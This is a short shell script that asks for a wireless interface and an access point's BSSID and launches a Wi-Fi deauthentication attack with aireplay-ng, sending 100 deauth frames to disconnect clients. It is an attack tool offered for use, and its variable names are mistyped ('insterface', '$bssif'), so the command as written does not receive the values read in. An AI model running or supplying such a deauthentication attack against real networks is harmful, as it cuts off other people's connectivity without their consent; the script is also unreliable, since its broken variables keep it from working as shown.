echo "Enter the interface : "
read insterface
echo "Enter the BSSID : "
read bssid
echo "wifi deauth started by aireplay ..." 
aireplay-ng --deauth 100 -a $bssif $interface
